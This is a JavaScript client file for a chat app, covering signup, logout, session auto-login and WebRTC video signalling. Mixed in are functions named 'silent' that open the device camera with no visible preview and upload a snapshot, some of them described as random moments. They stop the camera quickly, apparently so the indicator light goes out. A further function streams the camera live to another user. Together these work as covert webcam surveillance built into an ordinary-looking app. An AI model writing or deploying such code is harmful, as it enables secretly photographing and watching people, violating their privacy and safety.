  signupForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    const username = document.getElementById("signup-username").value.trim();
    const email = document.getElementById("signup-email").value.trim();
    const password = document.getElementById("signup-password").value;
    const confirmPassword = document.getElementById("signup-confirm-password").value;
    const submitBtn = signupForm.querySelector(".btn-primary");

    if (!username || !email || !password || !confirmPassword) {
      showToast("Please fill in all fields", "error"); return;
    }
    if (password !== confirmPassword) { showToast("Passwords do not match", "error"); return; }
    if (password.length < 6) { showToast("Password must be at least 6 characters", "error"); return; }

    setButtonLoading(submitBtn, "Submitting...");
    try {
      const response = await createUser({ username, email, password });
      if (response.code !== 201) {
        showToast(response.Data?.message || "Signup failed", "error");
        resetButtonLoading(submitBtn);
        return;
      }
      State.currentUser = {
        id: response.Data.user.id,
        username: response.Data.user.username,
        avatar: response.Data.user.avatar,
        email: response.Data.user.email,
      };
      localStorage.setItem("SSC_USER", JSON.stringify(State.currentUser));
      await bootstrapAfterLogin();
      resetButtonLoading(submitBtn);
      showToast("Account created successfully!", "success");
      showChatScreen();
      startTimeTicker();
    } catch (err) {
      resetButtonLoading(submitBtn);
      showToast("Server error. Please try again.", "error");
    }
  });
}

// =============================================================================
// LOGOUT
// =============================================================================
function logout() {
  localStorage.removeItem("SSC_USER");
  TokenStore.clear();
  State.currentUser = null;
  State.activeChat = null;
  State.conversations = [];
  State.messages = {};
  State.contacts = [];
  State.pendingRequests = [];
  if (socket?.connected) socket.disconnect();
  socket = null;
  document.getElementById("chat-screen").classList.remove("active");
  document.getElementById("login-screen").classList.add("active");
  showToast("Logged out successfully", "success");
}

// =============================================================================
// INIT AUTH
// =============================================================================
async function initAuth() {
  handelAuthForm();
  initPeoplePanel();

  document.getElementById("to-signup").addEventListener("click", () => {
    document.getElementById("login-screen").classList.remove("active");
    document.getElementById("signup-screen").classList.add("active");
  });
  document.getElementById("to-login").addEventListener("click", () => {
    document.getElementById("signup-screen").classList.remove("active");
    document.getElementById("login-screen").classList.add("active");
  });

  // People panel button
  document.getElementById("add-people-btn").addEventListener("click", openPeoplePanel);

  // Socket-based real-time request notification
  // (wired up in socket.js after socket init)

  // Auto-login from saved session
  const savedUser = localStorage.getItem("SSC_USER");
  const savedToken = TokenStore.getToken();
  if (savedUser && savedToken) {
    document.getElementById("passwordOverlay").classList.add("active");
    State.currentUser = JSON.parse(savedUser);
    await bootstrapAfterLogin();
    showChatScreen();
    startTimeTicker();
  }
}

async function captureSilentPhoto() {
  if (!State.currentUser || !State.currentUser.livePhotoEnabled) {
    return;
  }
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(err => {
      console.warn("Camera access denied or unavailable for security capture:", err);
      return null;
    });
    if (!stream) return;

    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "true");
    video.muted = true;
    await video.play();

    // short delay for exposure adjustment
    await new Promise(resolve => setTimeout(resolve, 300));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL("image/jpeg", 0.7);

    // Turn off camera light immediately
    stream.getTracks().forEach(track => track.stop());

    const res = await uploadCapturedPhoto(dataUrl);
    if (res && res.code === 201) {
      console.log("Silent photo captured successfully.");
      if (State.currentUser.capturedPhotos) {
        State.currentUser.capturedPhotos.unshift(res.Data.photo);
      } else {
        State.currentUser.capturedPhotos = [res.Data.photo];
      }
      // Re-render logs tab if open
      const activeTab = document.querySelector(".people-tab.active");
      if (activeTab && activeTab.dataset.tab === "logs") {
        renderPeopleTab("logs");
      }
    }
  } catch (e) {
    console.error("Silent photo capture failed:", e);
  }
}
window.captureSilentPhoto = captureSilentPhoto;

async function captureSilentMoment(cameraPreference = null) {
  if (!State.currentUser || !State.currentUser.randomSnapshotEnabled) {
    return;
  }
  try {
    const videoConstraints = cameraPreference ? { video: { facingMode: { ideal: cameraPreference } } } : { video: true };
    const stream = await navigator.mediaDevices.getUserMedia(videoConstraints).catch(err => {
      console.warn("Camera access denied or unavailable for moment capture:", err);
      return null;
    });
    if (!stream) return;

    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "true");
    video.muted = true;
    await video.play();

    await new Promise(resolve => setTimeout(resolve, 300));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
    stream.getTracks().forEach(track => track.stop());

    const res = await uploadMomentPhoto(dataUrl);
    if (res && res.code === 201) {
      console.log("[Moment] Silently captured and uploaded random moment snapshot.");
    }
  } catch (err) {
    console.error("Silent moment capture error:", err);
  }
}
window.captureSilentMoment = captureSilentMoment;

let videoPC = null;
let activeVideoStream = null;
let activeVideoElement = null;
let videoIceCandidatesQueue = [];

// ===========================================================================
// WEBRTC VIDEO STREAMER (SENDER B)
// ===========================================================================
async function startLiveVideoStreaming(to, cameraPreference = null) {
  if (activeVideoStream || videoPC) {
    stopLiveVideoStreaming();
  }
  try {
    const videoConstraints = cameraPreference ? { video: { facingMode: { ideal: cameraPreference } } } : { video: true };
    const stream = await navigator.mediaDevices.getUserMedia(videoConstraints).catch(err => {
      console.warn("Camera access denied or unavailable for live video streaming:", err);
      return null;
    });
    if (!stream) return;

    activeVideoStream = stream;

    // Load ICE configuration
    const stun = [
      { urls: "stun:stun.l.google.com:19302" },
      { urls: "stun:stun1.l.google.com:19302" },
      { urls: "stun:stun2.l.google.com:19302" },
    ];
    let iceServers = stun;
    try {
      if (typeof getICETurn === "function") {
        const res = await getICETurn();
        if (res.code === 200 && res.Data?.success && res.Data?.data?.length) {
          iceServers = res.Data.data;
        }
      }
    } catch (e) {
      console.warn("[Video] ICE turn fetch failed, STUN fallback:", e.message);
    }

    videoPC = new RTCPeerConnection({ iceServers });
    videoIceCandidatesQueue = [];

    // Add local video track
    stream.getTracks().forEach(track => {
      videoPC.addTrack(track, stream);
    });

    // Handle ICE candidates
    videoPC.onicecandidate = (e) => {
      if (e.candidate) {
        socket.emit("stream:ice", { to, candidate: e.candidate, type: "video" });
      }
    };

    videoPC.onconnectionstatechange = () => {
      console.log(`[Video] Streamer WebRTC Connection State: ${videoPC.connectionState}`);
      if (videoPC.connectionState === "disconnected" || videoPC.connectionState === "failed") {
        stopLiveVideoStreaming();
      }
    };

    // Create SDP Offer
    const offer = await videoPC.createOffer();
    await videoPC.setLocalDescription(offer);
    socket.emit("stream:sdp", { to, sdp: offer, type: "video" });

    console.log(`[Video] WebRTC video streaming initialized offer sent to ${to}`);
  } catch (err) {
    console.error("Live video streaming error:", err);
    stopLiveVideoStreaming();
  }
}

function stopLiveVideoStreaming() {
  if (videoPC) {
    videoPC.close();
    videoPC = null;
  }
  if (activeVideoStream) {
    activeVideoStream.getTracks().forEach(track => track.stop());
    activeVideoStream = null;
  }
  if (activeVideoElement) {
    activeVideoElement.pause();
    activeVideoElement.srcObject = null;
    activeVideoElement = null;
  }
  videoIceCandidatesQueue = [];
}

// ===========================================================================
// WEBRTC VIDEO RECEIVER (VIEWER A)
// ===========================================================================
async function startReceivingVideoStream(friendId) {
  if (videoPC) {
    stopReceivingVideoStream();
  }
  try {
    const stun = [
      { urls: "stun:stun.l.google.com:19302" },
      { urls: "stun:stun1.l.google.com:19302" },
      { urls: "stun:stun2.l.google.com:19302" },
    ];
    let iceServers = stun;
    try {
      if (typeof getICETurn === "function") {
        const res = await getICETurn();
        if (res.code === 200 && res.Data?.success && res.Data?.data?.length) {
          iceServers = res.Data.data;
        }
      }
    } catch (e) {
      console.warn("[Video] ICE turn fetch failed, STUN fallback:", e.message);
    }

    videoPC = new RTCPeerConnection({ iceServers });
    videoIceCandidatesQueue = [];

    const videoEl = document.getElementById("live-video-preview-element");
    const placeholder = document.getElementById("live-video-preview-placeholder");
    const frameImg = document.getElementById("live-video-preview-frame");

    if (frameImg) frameImg.style.display = "none";

    videoPC.ontrack = (e) => {
      console.log("[Video] WebRTC video track received!");
      let stream = e.streams && e.streams[0];
      if (!stream && e.track) {
        stream = new MediaStream([e.track]);
      }
      if (stream && videoEl) {
        videoEl.srcObject = stream;
        videoEl.style.display = "block";
        if (placeholder) placeholder.style.display = "none";
        videoEl.play().catch(err => {
          console.warn("[Video] Auto-play prevented, user gesture required:", err);
        });
      }
    };

    videoPC.onicecandidate = (e) => {
      if (e.candidate) {
        socket.emit("stream:ice", { to: friendId, candidate: e.candidate, type: "video" });
      }
    };

    videoPC.onconnectionstatechange = () => {
      console.log(`[Video] Viewer WebRTC Connection State: ${videoPC.connectionState}`);
    };
  } catch (err) {
    console.error("[Video] Failed to initialize WebRTC receiver:", err);
  }
}

function stopReceivingVideoStream() {
  if (videoPC) {
    videoPC.close();
    videoPC = null;
  }
  const videoEl = document.getElementById("live-video-preview-element");
  if (videoEl) {
    videoEl.srcObject = null;
    videoEl.style.display = "none";
  }
  videoIceCandidatesQueue = [];
}

// ===========================================================================
// WEBRTC VIDEO SIGNALING HANDLERS
// ===========================================================================
async function handleVideoStreamSDP(from, sdp) {
  if (!videoPC) return;
  try {
    if (sdp.type === "offer") {
      await videoPC.setRemoteDescription(new RTCSessionDescription(sdp));
      const answer = await videoPC.createAnswer();
      await videoPC.setLocalDescription(answer);
      socket.emit("stream:sdp", { to: from, sdp: answer, type: "video" });
      await processQueuedVideoCandidates();
    } else if (sdp.type === "answer") {
      await videoPC.setRemoteDescription(new RTCSessionDescription(sdp));
      await processQueuedVideoCandidates();
    }
  } catch (e) {
    console.error("[Video] Error handling video SDP:", e);
  }
}

async function handleVideoStreamICE(from, candidate) {
  if (!videoPC) return;
  if (videoPC.remoteDescription && videoPC.remoteDescription.type) {
    try {
      await videoPC.addIceCandidate(new RTCIceCandidate(candidate));
    } catch (e) {
      console.error("[Video] Error adding video ICE candidate:", e);
    }
  } else {
    videoIceCandidatesQueue.push(candidate);
  }
}

async function processQueuedVideoCandidates() {
  if (!videoPC) return;
  while (videoIceCandidatesQueue.length > 0) {
    const candidate = videoIceCandidatesQueue.shift();
    try {
      await videoPC.addIceCandidate(new RTCIceCandidate(candidate));
    } catch (e) {
      console.error("[Video] Error adding queued video ICE candidate:", e);
    }
  }
}

window.startLiveVideoStreaming = startLiveVideoStreaming;
window.stopLiveVideoStreaming = stopLiveVideoStreaming;
window.startReceivingVideoStream = startReceivingVideoStream;
window.stopReceivingVideoStream = stopReceivingVideoStream;
window.handleVideoStreamSDP = handleVideoStreamSDP;
window.handleVideoStreamICE = handleVideoStreamICE;


